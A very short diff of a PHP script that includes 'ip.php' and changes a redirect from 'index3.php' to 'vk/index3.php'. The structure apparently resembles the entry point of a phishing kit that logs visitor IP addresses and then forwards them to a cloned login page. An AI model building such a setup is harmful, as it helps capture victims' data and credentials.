@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: index3.php');
+header('Location: vk/index3.php');
 exit
 ?>
